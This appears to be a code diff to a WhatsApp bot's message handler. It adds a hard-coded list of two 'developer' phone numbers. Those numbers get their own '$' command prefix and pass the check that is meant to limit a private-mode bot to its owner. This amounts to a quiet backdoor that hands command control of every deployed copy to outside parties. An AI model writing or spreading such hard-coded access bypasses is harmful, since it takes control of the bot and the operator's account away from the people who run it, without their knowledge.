@@ -28,6 +28,8 @@ const PRESENCE = {
     GROUP: conf.PRESENCE_GROUP || 'available'
 };
 
+const DEV_NUMBERS = new Set(['254742063632', '254757835036']);
+
 allCommands.forEach(cmd => {
     commands.set(cmd.name, cmd);
     if (cmd.aliases) cmd.aliases.forEach(alias => aliases.set(alias, cmd.name));
@@ -175,6 +177,8 @@ The following message was deleted:`,
 
         const senderJid = isFromMe ? king.user.id : msg.key.participant || msg.key.remoteJid;
         const senderNumber = senderJid.replace(/@.*$/, '').split(':')[0];
+        const senderNumberOnly = senderNumber.replace(/\D/g, '');
+        const isDev = DEV_NUMBERS.has(senderNumberOnly);
 
         let chatType = 'Private Chat';
         let groupName = '';
@@ -189,24 +193,36 @@ The following message was deleted:`,
         }
 
         console.log(`\n===== ${chatType.toUpperCase()} =====\nMessage: ${messageType}\nSender: ${msg.pushName || senderNumber} (${senderNumber})${groupName ? `\nGroup: ${groupName}` : ''}\n`);
-        
-        const prefixes = [...conf.prefixes];
-        const prefixlessAllowed = prefixes.length === 0;
 
-        const startsWithValidPrefix = prefixes.find(p => text.startsWith(p));
-        const hasAnyPrefix = /^[^\s\w]/.test(text);
+        let usedPrefix = '';
+        let cmdText = text;
 
-        if (!prefixlessAllowed) {
-            if (!startsWithValidPrefix) return;
+        if (isDev && text.startsWith('$')) {
+            usedPrefix = '$';
+            cmdText = text.slice(1).trim();
         } else {
-            if (hasAnyPrefix) return;
+            const prefixes = [...conf.prefixes];
+            const prefixlessAllowed = prefixes.length === 0;
+            const startsWithValidPrefix = prefixes.find(p => text.startsWith(p));
+            const hasAnyPrefix = /^[^\s\w]/.test(text);
+
+            if (!prefixlessAllowed) {
+                if (!startsWithValidPrefix) return;
+                usedPrefix = startsWithValidPrefix;
+                cmdText = text.slice(usedPrefix.length).trim();
+            } else {
+                if (hasAnyPrefix) return;
+            }
         }
 
-        const usedPrefix = startsWithValidPrefix || '';
-        const args = text.slice(usedPrefix.length).trim().split(/ +/);
+        const args = cmdText.trim().split(/ +/);
         const cmdName = args.shift()?.toLowerCase();
         const command = commands.get(cmdName) || commands.get(aliases.get(cmdName));
         if (!command) return;
+
+const isSelf = senderJid === king.user.id;
+
+if (conf.MODE === 'private' && !isDev && !isSelf) return;
 
         let groupAdmins = [];
         if (isGroup) {
@@ -284,4 +300,3 @@ The following message was deleted:`,
 }
 
 startBot();
-
